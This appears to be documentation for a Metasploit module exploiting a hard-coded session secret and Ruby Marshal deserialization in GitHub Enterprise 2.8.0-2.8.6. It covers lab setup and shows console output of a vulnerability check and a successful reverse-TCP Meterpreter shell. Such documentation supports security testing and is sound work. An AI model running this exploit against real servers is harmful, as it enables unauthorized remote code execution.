This module exploits two security issues found in Github Enterprise 2. The first problem is
that the session management uses a hard-coded secret value, which can be abused to sign a
serialized malicious object. The second problem is that the serialized string is passed to
a ```Marshal.load``` API call, which deserializes the malicious object, and executes it. A
malicious attacker can take advantage of these problems to achieve remote code execution.

According to exablue.de, this RCE was reported to GitHub, and the researcher was rewarded
$18,000 total.

## Vulnerable Application

The following versions are affected:

* 2.8.0 - 2.8.6.

For testing purposes, you can download a Github Enterprise image from the following location:

[https://enterprise.github.com/releases/](https://enterprise.github.com/releases/)

This module was specifically tested against version 2.8.0, which can be downloaded here:

[https://github-enterprise.s3.amazonaws.com/esx/releases/github-enterprise-2.8.0.ova](https://github-enterprise.s3.amazonaws.com/esx/releases/github-enterprise-2.8.0.ova)

Before you install the image, you must have a valid key. Start from here:

[https://enterprise.github.com/sn-trial](https://enterprise.github.com/sn-trial)

After signing up for a trial, you should receive an e-mail. The email will instruct you to access
your portal account. In there, you can download your github-enterprise.ghl file, which is a key
to complete installing your Github Enterprise system.

## Using github_enterprise_secret

The module consists of two features: the ```check``` command and the ```exploit``` command.

The ```check``` command determines if the host is vulnerable or not by extracting the hash of the
cookie, and then attempts to create the same hash using the default secret key. If the two match,
it means the module can tamper the cookie, and that makes the server vulnerable to deserialization.

```
msf exploit(github_enterprise_secret) > check

[*] Found cookie value: _gh_manage=BAh7B0kiD3Nlc3Npb25faWQGOgZFVEkiRTViZTAwNjg4NDViYmYzNWQzMGZl%0AZTRiYWY2YmU4Mzg2MzQ2NjFjODcxYTAyZDZlZjA0YTQ2MWIzNDBiY2VkMGIG%0AOwBGSSIPY3NyZi50b2tlbgY7AFRJIjFZZ0I5ckVkbWhwclpmNWF5RmVia3Zv%0AQzVKMUVoVUxlRWNEbjRYbHplb2R3PQY7AEY%3D%0A--ab0866fc61ea036b1e83cd65b92c2b6cc5b001ed;, checking to see if it can be tampered...
[*] Data: BAh7B0kiD3Nlc3Npb25faWQGOgZFVEkiRTViZTAwNjg4NDViYmYzNWQzMGZlZTRiYWY2YmU4Mzg2MzQ2NjFjODcxYTAyZDZlZjA0YTQ2MWIzNDBiY2VkMGIGOwBGSSIPY3NyZi50b2tlbgY7AFRJIjFZZ0I5ckVkbWhwclpmNWF5RmVia3ZvQzVKMUVoVUxlRWNEbjRYbHplb2R3PQY7AEY=
[*] Extracted HMAC: ab0866fc61ea036b1e83cd65b92c2b6cc5b001ed
[*] Expected HMAC: ab0866fc61ea036b1e83cd65b92c2b6cc5b001ed
[*] The HMACs match, which means you can sign and tamper the cookie.
[+] 192.168.146.201:8443 The target is vulnerable.
msf exploit(github_enterprise_secret) > 
```

If vulnerable, the ```exploit``` command will attempt to gain access of the system:

```
msf exploit(github_enterprise_secret) > exploit

[*] Started reverse TCP handler on 192.168.146.1:4444 
[*] Serialized Ruby stager
[*] Sending serialized Ruby stager...
[*] Transmitting intermediate stager for over-sized stage...(105 bytes)
[*] Sending stage (1495599 bytes) to 192.168.146.201
[*] Meterpreter session 2 opened (192.168.146.1:4444 -> 192.168.146.201:52454) at 2017-03-23 10:11:17 -0500
[+] Deleted /tmp/htBDuK.bin
[+] Deleted /tmp/kXgpK.bin
[*] Connection timed out

meterpreter >
```
